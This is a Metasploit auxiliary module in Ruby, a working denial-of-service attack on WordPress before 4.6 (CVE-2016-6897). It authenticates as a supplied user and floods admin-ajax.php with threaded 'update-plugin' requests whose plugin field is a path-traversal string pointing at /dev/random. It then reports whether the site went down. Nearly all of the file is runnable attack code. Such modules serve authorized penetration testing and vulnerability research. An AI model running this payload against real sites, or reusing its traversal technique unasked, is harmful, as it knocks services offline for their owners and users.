##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Traversal Directory DoS',
      'Description'     =>  %q{
        Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin
        function in wp-admin/includes/ajax-actions.php in WordPress before 4.6
        allows remote attackers to hijack the authentication of subscribers
        for /dev/random read operations by leveraging a late call to
        the check_ajax_referer function, a related issue to CVE-2016-6896.},
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Yorick Koster',           # Vulnerability disclosure
          'CryptisStudents'          # Metasploit module
        ],
      'References'      =>
        [
          ['CVE', '2016-6897'],
          ['EDB', '40288'],
          ['OVEID', 'OVE-20160712-0036']
        ],
    ))

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
        OptInt.new('DEPTH', [true, 'The depth of the path', 10]),
        OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
        OptString.new('PASSWORD', [true, 'The password to send the requests with', ''])
        ])
  end

  def rlimit
    datastore['RLIMIT']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def depth
    datastore['DEPTH']
  end

  def user_exists(user)
    exists = wordpress_user_exists?(user)
    if exists
      print_good("Username \"#{user}\" is valid")
      return true
    else
      print_error("\"#{user}\" is not a valid username")
      return false
    end
  end

  def run
    if wordpress_and_online?
      print_status("Checking if user \"#{username}\" exists...")
      unless user_exists(username)
        print_error('Aborting operation - a valid username must be specified')
        return
      end

      starting_thread = 1

      cookie  = wordpress_login(username, password)
      store_valid_credential(user: username, private: password, proof: cookie)
      if cookie.nil?
        print_error('Aborting operation - failed to authenticate')
        return
      end

      path = "/#{'../' * depth}dev/random"

      while starting_thread < rlimit do
        ubound = [rlimit - (starting_thread - 1), thread_count].min
        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

        threads = []
        1.upto(ubound) do |i|
          threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
            begin
              # shell code
              res = send_request_cgi( opts = {
                'method' => 'POST',
                'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
                'vars_post' => {
                  'action' => 'update-plugin',
                  'plugin' => path
                },
                'cookie' => cookie
              }, timeout = 0.2)
            rescue => e
              print_error("Timed out during request #{(starting_thread - 1) + i}")
            end
          end
        end

        threads.each(&:join)

        print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
        starting_thread += ubound
      end

      if wordpress_and_online?
        print_error("FAILED: #{target_uri} appears to still be online")
      else
        print_good("SUCCESS: #{target_uri} appears to be down")
      end

    else
      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
    end
  end
end
